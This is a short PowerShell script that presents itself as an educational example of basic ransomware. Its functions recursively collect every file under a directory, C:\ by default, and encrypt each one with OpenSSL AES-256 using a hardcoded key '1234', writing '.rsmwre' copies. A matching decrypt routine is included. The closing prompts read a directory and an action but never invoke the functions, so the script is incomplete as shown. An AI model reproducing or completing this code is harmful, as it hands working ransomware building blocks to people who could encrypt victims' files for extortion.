<#
Code written by A13Xg
Property of Alexander Goodman
A13Xg Industries
#>

## ABOUT
# This utility is designed to provide an example of a very basic RansomWare threat.
# This is provided strictly for the sake of testing and educational purposes ONLY.

    #// Example Encrypt Function
# openssl enc -aes-256-cbc -in un_encrypted.data -out encrypted.data
    #// Example Decrpyt Function
# openssl enc -d -aes-256-cbc -in encrypted.data -out un_encrypted.data

function GetFileScope {
    [CmdletBinding()]
    param (
       [STRING] $Directory = 'C:\'
    )
   $global:fileScope = (Get-ChildItem -Path $Directory -File -Recurse).FullName
}

function Encrypt {
    [CmdletBinding()]
    param (
       [STRING] $Key = '1234'
    )
    ForEach ($inFile in $fileScope) {
        Write-Host "Encrypting $inFile ..."
        $outFile = $inFile + '.rsmwre'
        .\OpenSSL.exe enc -aes-256-cbc -in $inFile -out $outFile -k $Key
        Write-Host "Done."
    }
}
function Decrypt {
    [CmdletBinding()]
    param (
       [STRING] $Key = '1234'
    )
    ForEach ($inFile in $fileScope) {
        Write-Host "Decrypting $inFile ..."
        $FileName = Split-Path $inFile -Leaf
        $Extension = $FileName.Split('.') | Select-Object -Last 1
        $FileNameWoExt = $FileName.Substring(0, $FileName.Length - $Extension.Length - 1)
        $outFile = $FileNameWoExt
        .\OpenSSL.exe enc -d -aes-256-cbc -in $inFile -out $outFile -k $Key
        Write-Host "Done."
    }
}

function RsmWre {
    param (
        [STRING] $Action
    )
    IF ($Action -eq "Encrypt") {
        Encrypt
    }
    ELSEIF ($Action -eq "Decrypt") {
        Decrypt
    }
    ELSE {
        Write-Error -Message "You did not supply a proper value for function RsmWre"
    }
}

$Directory = Read-Host -Prompt "Enter target directory"
$Action = Read-Host -Prompt "Enter action type"